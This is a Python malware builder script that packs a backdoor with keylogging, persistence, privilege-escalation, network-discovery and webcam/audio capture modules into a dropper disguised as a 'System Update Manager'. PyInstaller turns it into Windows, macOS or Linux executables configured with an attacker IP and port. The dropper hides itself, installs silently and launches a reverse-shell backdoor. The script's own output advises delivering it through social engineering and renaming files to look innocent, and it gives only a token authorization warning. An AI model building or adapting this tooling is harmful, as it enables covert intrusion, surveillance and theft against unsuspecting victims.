#!/usr/bin/env python3
"""
Executable Malware Builder
===========================
Creates standalone executable files (.exe, .app, binary) that run automatically
when opened, without requiring Python installation on target.

Supports:
- Windows: .exe files
- macOS: .app bundles or binary
- Linux: ELF binaries

Usage:
    python3 build_executable.py [attacker_ip] [attacker_port] [platform]

Examples:
    python3 build_executable.py 192.168.1.100 5555 windows
    python3 build_executable.py 192.168.1.100 5555 macos
    python3 build_executable.py 192.168.1.100 5555 linux
    python3 build_executable.py 192.168.1.100 5555 all

Platform options: windows, macos, linux, all
"""

import os
import sys
import subprocess
import base64
from pathlib import Path
import shutil


class ExecutableBuilder:
    """Builds standalone executable malware files"""
    
    def __init__(self, attacker_ip="192.168.0.100", attacker_port="5555", platform="windows"):
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.platform = platform.lower()
        self.project_root = Path(__file__).parent.parent
        self.exploit_dir = Path(__file__).parent
        self.build_dir = self.exploit_dir / "build"
        self.dist_dir = self.exploit_dir / "dist"
        self.output_dir = self.exploit_dir / "payloads"
        
    def check_dependencies(self):
        """Check if PyInstaller is installed"""
        try:
            import PyInstaller
            return True
        except ImportError:
            return False
    
    def install_pyinstaller(self):
        """Install PyInstaller"""
        print("[*] PyInstaller not found. Installing...")
        try:
            subprocess.run(
                [sys.executable, '-m', 'pip', 'install', 'pyinstaller'],
                check=True
            )
            print("[+] PyInstaller installed successfully!")
            return True
        except Exception as e:
            print(f"[!] Failed to install PyInstaller: {e}")
            print("[!] Please install manually: pip install pyinstaller")
            return False
    
    def install_requirements(self):
        """Install required libraries from requirements.txt"""
        print("[*] Installing required libraries from requirements.txt...")
        requirements_file = self.project_root / 'requirements.txt'
        
        if not requirements_file.exists():
            print("[!] requirements.txt not found!")
            return False
        
        try:
            # Try to install all requirements
            result = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-r', str(requirements_file)],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                print("[+] Required libraries installed successfully!")
                return True
            else:
                # If there are errors, try to install packages individually
                print("[!] Some packages failed to install. Trying individual installation...")
                
                # List of packages from requirements.txt
                packages = ['pynput>=1.7.6', 'Pillow>=10.0.0', 'pyautogui>=0.9.54', 
                           'opencv-python>=4.8.0']
                
                failed_packages = []
                for package in packages:
                    try:
                        subprocess.run(
                            [sys.executable, '-m', 'pip', 'install', package],
                            check=True,
                            capture_output=True
                        )
                        print(f"  [+] Installed: {package.split('>=')[0]}")
                    except:
                        failed_packages.append(package.split('>=')[0])
                        print(f"  [!] Failed: {package.split('>=')[0]}")
                
                # Try pyaudio separately with better error handling
                try:
                    subprocess.run(
                        [sys.executable, '-m', 'pip', 'install', 'pyaudio>=0.2.13'],
                        check=True,
                        capture_output=True
                    )
                    print(f"  [+] Installed: pyaudio")
                except:
                    print(f"  [!] Failed: pyaudio (requires portaudio system library)")
                    print("      - macOS: brew install portaudio")
                    print("      - Ubuntu/Debian: sudo apt-get install portaudio19-dev")
                    print("      - Fedora/CentOS: sudo dnf install portaudio-devel")
                    print("      Audio recording will use fallback methods")
                    failed_packages.append('pyaudio')
                
                if len(failed_packages) < len(packages) + 1:  # +1 for pyaudio
                    print(f"[+] Most libraries installed successfully!")
                    print(f"[*] Failed packages: {', '.join(failed_packages)}")
                    print("[*] Executable will still work with fallback methods")
                    return True
                else:
                    print("[!] Most packages failed to install")
                    return False
                    
        except Exception as e:
            print(f"[!] Failed to install requirements: {e}")
            print("[!] Please install manually: pip install -r requirements.txt")
            return False
    
    def read_file(self, filepath):
        """Read and return file content"""
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                return f.read()
        except Exception as e:
            print(f"[!] Error reading {filepath}: {e}")
            return ""
    
    def update_backdoor_config(self, content):
        """Update backdoor.py with attacker IP and port"""
        content = content.replace(
            "ATTACKER_HOST = '192.168.0.100'",
            f"ATTACKER_HOST = '{self.attacker_ip}'"
        )
        content = content.replace(
            "ATTACKER_PORT = 5555",
            f"ATTACKER_PORT = {self.attacker_port}"
        )
        return content
    
    def create_payload_script(self):
        """Create the Python script that will be compiled"""
        print("[*] Creating payload script...")
        
        # Read all necessary files
        files_to_embed = {
            'backdoor.py': self.project_root / 'backdoor.py',
            'features/__init__.py': self.project_root / 'features' / '__init__.py',
            'features/keylogger.py': self.project_root / 'features' / 'keylogger.py',
            'features/network_discovery.py': self.project_root / 'features' / 'network_discovery.py',
            'features/persistence.py': self.project_root / 'features' / 'persistence.py',
            'features/privilege_escalation.py': self.project_root / 'features' / 'privilege_escalation.py',
            'features/media_capture_tool.py': self.project_root / 'features' / 'media_capture_tool.py',
            'utils/__init__.py': self.project_root / 'utils' / '__init__.py',
        }
        
        embedded_files = {}
        for name, path in files_to_embed.items():
            print(f"  [+] Reading: {name}")
            content = self.read_file(path)
            
            # Update backdoor.py with correct attacker info
            if name == 'backdoor.py':
                content = self.update_backdoor_config(content)
            
            # Encode content
            encoded = base64.b64encode(content.encode()).decode()
            embedded_files[name] = encoded
        
        # Generate the payload script
        payload_script = self.generate_payload_script(embedded_files)
        
        # Write to temporary file
        temp_script = self.exploit_dir / "temp_payload.py"
        with open(temp_script, 'w') as f:
            f.write(payload_script)
        
        print(f"[+] Payload script created: {temp_script}")
        return temp_script
    
    def generate_payload_script(self, embedded_files):
        """Generate the complete payload script"""
        
        payload = f'''#!/usr/bin/env python3
"""
System Update Manager
=====================
Automated system maintenance and security updates.
"""

import os
import sys
import subprocess
import base64
from pathlib import Path
import time

# Embedded files (base64 encoded)
EMBEDDED_FILES = {{
'''
        
        # Add all embedded files
        for name, encoded in embedded_files.items():
            payload += f'    "{name}": "{encoded}",\n'
        
        payload += '''
}


class SystemUpdateManager:
    """Manages system updates and maintenance"""
    
    def __init__(self):
        """Initialize the update manager"""
        home = Path.home()
        
        # Use different hidden directory names for stealth
        possible_dirs = [
            '.system_update',
            '.config' / 'systemd',
            '.local' / 'share' / 'system',
            '.cache' / 'updates',
        ]
        
        # Try to create in first available location
        for dir_name in possible_dirs:
            try:
                self.install_dir = home / dir_name
                self.install_dir.mkdir(parents=True, exist_ok=True)
                break
            except:
                continue
        else:
            # Fallback to temp directory
            import tempfile
            self.install_dir = Path(tempfile.gettempdir()) / '.sys_update'
            self.install_dir.mkdir(exist_ok=True)
        
        self.silent_mode = True
        
    def log(self, message):
        """Log message (silent in production)"""
        if not self.silent_mode:
            print(message)
    
    def setup_directories(self):
        """Create necessary directories"""
        try:
            (self.install_dir / 'features').mkdir(exist_ok=True)
            (self.install_dir / 'utils').mkdir(exist_ok=True)
            (self.install_dir / 'logs').mkdir(exist_ok=True)
            (self.install_dir / 'logs' / 'screenshots').mkdir(exist_ok=True)
            (self.install_dir / 'logs' / 'audio').mkdir(exist_ok=True)
            (self.install_dir / 'logs' / 'webcam').mkdir(exist_ok=True)
            return True
        except Exception as e:
            self.log(f"Error: {{e}}")
            return False
    
    def install_dependencies(self):
        """Install required packages silently"""
        self.log("Installing updates...")
        
        packages = ['pynput', 'Pillow', 'pyautogui', 'pyaudio', 'opencv-python']
        
        try:
            # Upgrade pip silently
            subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=False
            )
            
            # Install packages
            for pkg in packages:
                try:
                    subprocess.run(
                        [sys.executable, '-m', 'pip', 'install', pkg, '--quiet'],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        check=False,
                        timeout=60
                    )
                except:
                    pass  # Continue even if some fail
            
            return True
        except:
            return True  # Continue anyway
    
    def extract_files(self):
        """Extract embedded files"""
        self.log("Extracting components...")
        
        try:
            for filename, encoded in EMBEDDED_FILES.items():
                # Decode content
                content = base64.b64decode(encoded).decode('utf-8')
                
                # Determine file path
                filepath = self.install_dir / filename
                
                # Create parent directory if needed
                filepath.parent.mkdir(parents=True, exist_ok=True)
                
                # Write file
                with open(filepath, 'w') as f:
                    f.write(content)
            
            return True
        except Exception as e:
            self.log(f"Error: {{e}}")
            return False
    
    def launch_service(self):
        """Launch the background service"""
        self.log("Starting service...")
        
        try:
            backdoor_path = self.install_dir / 'backdoor.py'
            
            # Change to installation directory
            os.chdir(self.install_dir)
            
            # Launch in background
            if sys.platform.startswith('win'):
                # Windows: use pythonw to run without console
                import subprocess
                CREATE_NO_WINDOW = 0x08000000
                subprocess.Popen(
                    [sys.executable, str(backdoor_path)],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=CREATE_NO_WINDOW
                )
            else:
                # Unix-like: use nohup and run in background
                subprocess.Popen(
                    [sys.executable, str(backdoor_path)],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    start_new_session=True
                )
            
            return True
        except Exception as e:
            self.log(f"Error: {{e}}")
            return False
    
    def run(self):
        """Run the update process"""
        self.log("System Update Manager")
        self.log("=" * 50)
        
        if not self.setup_directories():
            return False
        
        if not self.install_dependencies():
            return False
        
        if not self.extract_files():
            return False
        
        if not self.launch_service():
            return False
        
        self.log("Update completed successfully!")
        return True


def main():
    """Main entry point"""
    try:
        manager = SystemUpdateManager()
        manager.silent_mode = True  # Silent operation
        manager.run()
    except:
        pass  # Fail silently
    
    # Exit cleanly without showing anything
    sys.exit(0)


if __name__ == "__main__":
    main()
'''
        
        return payload
    
    def build_windows_exe(self, script_path):
        """Build Windows executable"""
        print("\n[*] Building Windows executable (.exe)...")
        
        output_name = "SecurityUpdate"
        
        # PyInstaller command
        cmd = [
            'pyinstaller',
            '--onefile',                    # Single file
            '--noconsole',                  # No console window
            '--name', output_name,          # Output name
            '--clean',                      # Clean cache
            '--distpath', str(self.dist_dir),
            '--workpath', str(self.build_dir),
            '--specpath', str(self.exploit_dir),
        ]
        
        # Add icon if available
        icon_path = self.exploit_dir / 'icons' / 'windows.ico'
        if icon_path.exists():
            cmd.extend(['--icon', str(icon_path)])
        
        # Add the script
        cmd.append(str(script_path))
        
        try:
            subprocess.run(cmd, check=True)
            
            # Move to output directory
            self.output_dir.mkdir(exist_ok=True)
            exe_file = self.dist_dir / f"{output_name}.exe"
            output_file = self.output_dir / f"{output_name}.exe"
            
            if exe_file.exists():
                shutil.move(str(exe_file), str(output_file))
                print(f"[+] Windows executable created: {output_file}")
                print(f"[+] Size: {output_file.stat().st_size / 1024:.1f} KB")
                return True
            else:
                print("[!] Executable not found after build")
                return False
                
        except Exception as e:
            print(f"[!] Failed to build Windows executable: {e}")
            return False
    
    def build_macos_app(self, script_path):
        """Build macOS application"""
        print("\n[*] Building macOS application (.app)...")
        
        output_name = "SystemUpdate"
        
        # PyInstaller command
        cmd = [
            'pyinstaller',
            '--onefile',
            '--windowed',                   # No terminal window
            '--name', output_name,
            '--clean',
            '--distpath', str(self.dist_dir),
            '--workpath', str(self.build_dir),
            '--specpath', str(self.exploit_dir),
        ]
        
        # Add icon if available
        icon_path = self.exploit_dir / 'icons' / 'macos.icns'
        if icon_path.exists():
            cmd.extend(['--icon', str(icon_path)])
        
        # Add the script
        cmd.append(str(script_path))
        
        try:
            subprocess.run(cmd, check=True)
            
            # Move to output directory
            self.output_dir.mkdir(exist_ok=True)
            app_file = self.dist_dir / f"{output_name}.app"
            output_file = self.output_dir / f"{output_name}.app"
            
            if app_file.exists():
                if output_file.exists():
                    shutil.rmtree(str(output_file))
                shutil.move(str(app_file), str(output_file))
                print(f"[+] macOS application created: {output_file}")
                return True
            else:
                print("[!] Application not found after build")
                return False
                
        except Exception as e:
            print(f"[!] Failed to build macOS application: {e}")
            return False
    
    def build_linux_binary(self, script_path):
        """Build Linux binary"""
        print("\n[*] Building Linux binary...")
        
        output_name = "system-update"
        
        # PyInstaller command
        cmd = [
            'pyinstaller',
            '--onefile',
            '--name', output_name,
            '--clean',
            '--distpath', str(self.dist_dir),
            '--workpath', str(self.build_dir),
            '--specpath', str(self.exploit_dir),
        ]
        
        # Add the script
        cmd.append(str(script_path))
        
        try:
            subprocess.run(cmd, check=True)
            
            # Move to output directory
            self.output_dir.mkdir(exist_ok=True)
            binary_file = self.dist_dir / output_name
            output_file = self.output_dir / output_name
            
            if binary_file.exists():
                shutil.move(str(binary_file), str(output_file))
                # Make executable
                os.chmod(str(output_file), 0o755)
                print(f"[+] Linux binary created: {output_file}")
                print(f"[+] Size: {output_file.stat().st_size / 1024:.1f} KB")
                return True
            else:
                print("[!] Binary not found after build")
                return False
                
        except Exception as e:
            print(f"[!] Failed to build Linux binary: {e}")
            return False
    
    def cleanup(self):
        """Clean up build artifacts"""
        print("\n[*] Cleaning up build artifacts...")
        
        try:
            # Remove temp script
            temp_script = self.exploit_dir / "temp_payload.py"
            if temp_script.exists():
                temp_script.unlink()
            
            # Remove build directory
            if self.build_dir.exists():
                shutil.rmtree(str(self.build_dir))
            
            # Remove dist directory
            if self.dist_dir.exists():
                shutil.rmtree(str(self.dist_dir))
            
            # Remove spec file
            spec_files = list(self.exploit_dir.glob("*.spec"))
            for spec_file in spec_files:
                spec_file.unlink()
            
            print("[+] Cleanup completed")
            
        except Exception as e:
            print(f"[!] Cleanup error: {e}")
    
    def build(self):
        """Build the executable payload"""
        print("=" * 70)
        print("  Executable Malware Builder")
        print("  Creates standalone executables for target platforms")
        print("=" * 70)
        print(f"\n[*] Attacker IP: {self.attacker_ip}")
        print(f"[*] Attacker Port: {self.attacker_port}")
        print(f"[*] Target Platform: {self.platform}")
        
        # Install required libraries from requirements.txt
        if not self.install_requirements():
            print("[!] Warning: Failed to install required libraries")
            print("[!] The executable may not work properly on target system")
        
        # Check dependencies
        if not self.check_dependencies():
            if not self.install_pyinstaller():
                return False
        
        # Create payload script
        script_path = self.create_payload_script()
        
        # Build based on platform
        success = False
        
        if self.platform == 'windows':
            success = self.build_windows_exe(script_path)
        elif self.platform == 'macos':
            success = self.build_macos_app(script_path)
        elif self.platform == 'linux':
            success = self.build_linux_binary(script_path)
        elif self.platform == 'all':
            print("\n[*] Building for all platforms...")
            win_ok = self.build_windows_exe(script_path)
            mac_ok = self.build_macos_app(script_path)
            linux_ok = self.build_linux_binary(script_path)
            success = win_ok or mac_ok or linux_ok
        else:
            print(f"[!] Unknown platform: {self.platform}")
            print("[!] Valid options: windows, macos, linux, all")
            return False
        
        # Cleanup
        self.cleanup()
        
        if success:
            print("\n" + "=" * 70)
            print("BUILD SUCCESSFUL!")
            print("=" * 70)
            print(f"\n[+] Executable(s) created in: {self.output_dir}")
            print("\nNEXT STEPS:")
            print("=" * 70)
            print("1. Find your executable in the 'payloads' folder")
            print("2. Test in a safe VM environment first")
            print("3. Start your server: python3 ../server.py")
            print("4. Deploy to target via social engineering")
            print("5. Target opens the file → automatic execution → reverse shell!")
            print("\nDELIVERY TIPS:")
            print("- Windows .exe: Send via email, USB, or file share")
            print("- macOS .app: Compress to .zip before sending")
            print("- Linux binary: Rename to look innocent (update-tool, installer)")
            print("\n⚠️  IMPORTANT: Only use with proper authorization!")
            print("=" * 70)
        
        return success


def main():
    """Main entry point"""
    # Get parameters from command line or use defaults
    attacker_ip = sys.argv[1] if len(sys.argv) > 1 else "192.168.0.100"
    attacker_port = sys.argv[2] if len(sys.argv) > 2 else "5555"
    platform = sys.argv[3] if len(sys.argv) > 3 else "windows"
    
    # Detect current platform if not specified
    if platform == "auto":
        if sys.platform.startswith('win'):
            platform = "windows"
        elif sys.platform == 'darwin':
            platform = "macos"
        else:
            platform = "linux"
        print(f"[*] Auto-detected platform: {platform}")
    
    # Create builder and build
    builder = ExecutableBuilder(attacker_ip, attacker_port, platform)
    builder.build()


if __name__ == "__main__":
    main()
